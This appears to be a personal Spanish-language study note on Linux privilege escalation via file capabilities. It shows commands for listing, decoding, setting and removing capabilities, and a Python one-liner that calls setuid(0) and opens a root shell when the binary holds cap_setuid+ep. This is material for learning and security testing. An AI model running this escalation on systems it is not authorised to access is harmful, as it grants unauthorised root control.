- Tags : #escalada #escalada_privilegios #escalada_privilegios_linux #escalada_privilegios_capabilities
...
Capturar paquetes com TCP-DUMP
```bash
#Capturamos paquetes ICMP sin aplicad resolucion DNS
tcpdump -i eth0 icmp -n -w Captura.cap
```

Los **PID** de los procesos los podemos ver en el directorio **/proc**
![](../../../attachments/Pasted%20image%2020260220114531.png)

Listar las capabilities existentes, 
![](../../../attachments/Pasted%20image%2020260220114924.png)
```bash
cat /proc/9/status | grep Cap

capsh --decode=000003fffffffff
```

Setear una Capabilitie
![](../../../attachments/Pasted%20image%2020260220115313.png)

Enumerar capabilities con cualquier usuario para ver cuales existen
```bash 
getcap -r / 2>x/dev/null
```

Ver las capabilities de un pproceso por el PID
```bash
getpcaps PID
```

Capabilities que suponen un riesgo **cap_setuid+ep**.  Por ejemplo si 
```bash 
#Al binario de python3 le damoos esta capabilitie *cap_setuid+ep* pues mediante python podremos modificar el uid del usuario en cuestion pudiendo de esta manera escalar a root

setcap cap_setuid+ep /usr/bin/python3.10

#Quita las capabilities sobre un binario
setcap -r /usr/bin/python3.10


#Aqui con python nos omportamos la libreria os , cambiamos el uid a 0 que es el de root y finalmente nos lanzamos una bash que se ejecutara como el usuario root ya que cambiamos el uid (user id)
python -c "import os; os.setuid(0);os.system('bash')"
```

![](../../../attachments/Pasted%20image%2020260220160738.png)